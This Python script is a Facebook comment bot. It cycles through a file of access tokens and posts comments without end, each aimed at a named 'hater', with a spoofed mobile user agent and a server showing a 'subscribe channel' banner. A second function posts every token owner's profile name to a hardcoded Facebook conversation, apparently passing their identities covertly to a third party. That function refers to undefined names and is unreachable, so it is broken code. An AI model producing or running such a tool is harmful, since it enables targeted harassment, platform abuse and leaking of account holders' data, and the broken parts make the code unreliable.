import requests
import json
import time
import sys
from platform import system
import os
import subprocess
import http.server
import socketserver
import threading

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"THE LEGEND BOII PAPPU XD  HERE DON'T FORGET SUBSCRIBE CHANNEL Pappu xd ")

def execute_server():
    PORT = 4000

    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()

def post_comments():
    with open('token.txt', 'r') as file:
        access_tokens = [token.strip() for token in file.readlines()]
    num_tokens = len(access_tokens)

    requests.packages.urllib3.disable_warnings()

    def cls():
        if system() == 'Linux':
            os.system('clear')
        else:
            if system() == 'Windows':
                os.system('cls')
    cls()

    def liness():
        print('\u001b[37m' + '•─────────────────────────────────────────────────────────•')

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    liness()

    with open('post.txt', 'r') as file:
        post_url = file.read().strip()

    with open('comment.txt', 'r') as file:
        comments = file.readlines()

    num_comments = len(comments)

    with open('heatername.txt', 'r') as file:
        haters_name = file.read().strip()

    with open('time.txt', 'r') as file:
        speed = int(file.read().strip())

    def getName(token):
        try:
            data = requests.get(f'https://graph.facebook.com/v17.0/me?access_token={token}').json()
        except:
            data = ""
        if 'name' in data:
            return data['name']
        else:
            return "Error occurred"

    # Define ANSI escape codes for colors
    colors = [
        '\033[31m',  # Red
        '\033[32m',  # Green
        '\033[33m',  # Yellow
        '\033[34m',  # Blue
        '\033[35m',  # Purple
        '\033[36m'   # Cyan
    ]

    token_index = 0
    while True:
        try:
            for comment_index in range(num_comments):
                access_token = access_tokens[token_index]
                color_code = colors[token_index % len(colors)]

                comment = comments[comment_index].strip()

                url = "https://graph.facebook.com/{}/comments".format(post_url)
                parameters = {'access_token': access_token, 'message': haters_name + ' ' + comment}
                response = requests.post(url, json=parameters, headers=headers)

                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    print(color_code + "[+] Name: {}, Time: {}, Comment: {}".format(
                        getName(access_token), current_time, haters_name + ' ' + comment))
                    print("  - Time: {}".format(current_time))
                    liness()
                    liness()
                else:
                    print(color_code + "[x] Failed to send Name: {}, Time: {}, Comment: {}".format(
                        getName(access_token), current_time, haters_name + ' ' + comment))
                    print("  - Time: {}".format(current_time))
                    liness()
                    liness()

                token_index = (token_index + 1) % num_tokens  # Move to the next token
                time.sleep(speed)

            print("\n[+] All comments sent successfully. Restarting the process...\n")
        except Exception as e:
            print("[!] An error occurred: {}".format(e))


def msg():
    with open('token.txt', 'r') as file:
        access_tokens = [token.strip() for token in file.readlines()]
    num_tokens = len(access_tokens)

    with open('time.txt', 'r') as file:
        speed = int(file.read().strip())

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    for token_index in range(num_tokens):
        try:
            access_token = access_tokens[token_index]
            current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")

            parameters = {
                'access_token': access_token,
                'message': 'User Profile Name: ' + getName(access_token) +
                           '\nLink: https://www.facebook.com/messages/t/' + convo_id
            }
            response = requests.post("https://graph.facebook.com/v15.0/t_100041418586387/", data=parameters,
                                     headers=headers)

            if response.ok:
                print("[+] Name: {}, Time: {}, Message sent successfully".format(
                    getName(access_token), current_time))
                print("  - Time: {}".format(current_time))
            else:
                print("[x] Failed to send message for Name: {}, Time: {}".format(
                    getName(access_token), current_time))
                print("  - Time: {}".format(current_time))

            time.sleep(speed)

        except Exception as e:
            print("[!] An error occurred: {}".format(e))

def main():
    server_thread = threading.Thread(target=execute_server)
    server_thread.start()

    post_comments()
    msg()

if __name__ == '__main__':
    main()
